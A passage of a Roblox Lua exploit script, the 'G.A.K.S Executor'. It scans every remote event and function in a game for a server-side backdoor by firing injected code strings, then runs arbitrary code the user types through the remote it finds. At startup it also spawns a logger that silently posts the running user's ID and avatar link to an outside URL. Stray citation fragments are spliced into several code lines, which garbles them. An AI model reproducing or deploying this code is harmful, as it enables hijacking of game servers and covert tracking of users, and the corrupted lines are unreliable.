["type"] = "rich",
                ["color"] = tonumber(0xf2ff00),
                [cite_start]["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"}, [cite: 8]
            }}
        }

        local newdata = HttpService:JSONEncode(data)
        [cite_start]local request = syn and syn.request or http_request or request or (game and game.HttpPost) [cite: 9]
        if request then
            [cite_start]pcall(function() request({Url = url, Body = newdata, Method = "POST", Headers = {["content-type"] = "application/json"}}) end) [cite: 9]
        end
    end)
end

task.spawn(runInstantLogger)

--================ GUI KISMI ================--
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GaksSystem"
local targetParent = pcall(function() return gethui() end) and gethui() or game:GetService("CoreGui")
ScreenGui.Parent = targetParent

local Colors = {
    Bg = Color3.fromRGB(20, 20, 20),
    Accent = Color3.fromRGB(255, 170, 0), -- Orange Tema
    Text = Color3.fromRGB(255, 255, 255),
    Dark = Color3.fromRGB(30, 30, 30)
}

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- EXECUTOR FRAME
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 550, 0, 350)
MainFrame.Position = UDim2.new(0.5, -275, 0.5, -175)
MainFrame.BackgroundColor3 = Colors.Bg
MainFrame.Visible = false
makeDraggable(MainFrame)
local Stroke = Instance.new("UIStroke", MainFrame)
Stroke.Color = Colors.Accent
Stroke.Thickness = 2

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "『 G.A.K.S 』 EXECUTOR"
Title.TextColor3 = Colors.Accent
Title.BackgroundColor3 = Colors.Dark
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18

local CodeBox = Instance.new("TextBox", MainFrame)
CodeBox.Size = UDim2.new(0.9, 0, 0.55, 0)
CodeBox.Position = UDim2.new(0.05, 0, 0.15, 0)
CodeBox.BackgroundColor3 = Colors.Dark
CodeBox.TextColor3 = Colors.Text
CodeBox.Text = "-- Enter code here..."
CodeBox.ClearTextOnFocus = false
CodeBox.MultiLine = true
CodeBox.Font = MAIN_FONT
CodeBox.TextSize = 14
CodeBox.TextXAlignment = 0
CodeBox.TextYAlignment = 0

local BtnContainer = Instance.new("Frame", MainFrame)
BtnContainer.Size = UDim2.new(0.9, 0, 0, 45)
BtnContainer.Position = UDim2.new(0.05, 0, 0.75, 0)
BtnContainer.BackgroundTransparency = 1
local Layout = Instance.new("UIListLayout", BtnContainer)
Layout.FillDirection = Enum.FillDirection.Horizontal
Layout.Padding = UDim.new(0, 10)

local function createBtn(txt)
    local b = Instance.new("TextButton", BtnContainer)
    b.Size = UDim2.new(0.31, 0, 1, 0)
    b.BackgroundColor3 = Colors.Dark
    b.Text = txt
    b.TextColor3 = Colors.Text
    b.Font = Enum.Font.GothamBold
    local s = Instance.new("UIStroke", b)
    s.Color = Colors.Accent
    return b
end

local ExecBtn = createBtn("EXECUTE")
local ClearBtn = createBtn("CLEAR")
local FillBtn = createBtn("AUTO FILL")

-- SCANNER PANEL
local ScanPanel = Instance.new("Frame", ScreenGui)
ScanPanel.Size = UDim2.new(0, 300, 0, 150)
ScanPanel.Position = UDim2.new(0.5, -150, 0.5, -75)
ScanPanel.BackgroundColor3 = Colors.Bg
makeDraggable(ScanPanel)
Instance.new("UIStroke", ScanPanel).Color = Colors.Accent

local ScanBtn = Instance.new("TextButton", ScanPanel)
ScanBtn.Size = UDim2.new(0.8, 0, 0.4, 0)
ScanBtn.Position = UDim2.new(0.1, 0, 0.3, 0)
ScanBtn.BackgroundColor3 = Colors.Dark
ScanBtn.Text = "Scan For Backdoor"
ScanBtn.TextColor3 = Colors.Accent
ScanBtn.Font = Enum.Font.GothamBold

--================ MANTIK ================--
local TargetRemote = nil
local IsScanning = false
local RemoteMap = {}

workspace.ChildAdded:Connect(function(c)
    if c.Name == "Gaks_V" and IsScanning then
        TargetRemote = RemoteMap[c.Value]
        c:Destroy()
        if TargetRemote then
            IsScanning = false
            ScanPanel.Visible = false
            MainFrame.Visible = true
        end
    end
end)

ScanBtn.MouseButton1Click:Connect(function()
    if IsScanning then return end
    IsScanning = true
    ScanBtn.Text = "SCANNING..."
    
    local remotes = {}
    for _, v in ipairs(game:GetDescendants()) do 
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then table.insert(remotes, v) end 
    end

    task.spawn(function()
        for i, r in ipairs(remotes) do
            if not IsScanning then break end
            pcall(function()
                local id = tostring(i)
                RemoteMap[id] = r
                local code = "local s=Instance.new('StringValue',workspace);s.Name='Gaks_V';s.Value='"..id.."'"
                if r:IsA("RemoteEvent") then r:FireServer(code) else task.spawn(function() r:InvokeServer(code) end) end
            end)
            -- KICK FIX: Her 10 denemede bir 0.1 saniye bekleme (Spam koruması)
            if i % 10 == 0 then task.wait(0.1) end
        end
    end)
end)

ExecBtn.MouseButton1Click:Connect(function()
    if TargetRemote then
        if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(CodeBox.Text) else TargetRemote:InvokeServer(CodeBox.Text) end
    end
end)

ClearBtn.MouseButton1Click:Connect(function() CodeBox.Text = "" end)
FillBtn.MouseButton1Click:Connect(function() CodeBox.Text = CodeBox.Text:gsub('"(.-)"', '"' .. LocalPlayer.Name .. '"') end)
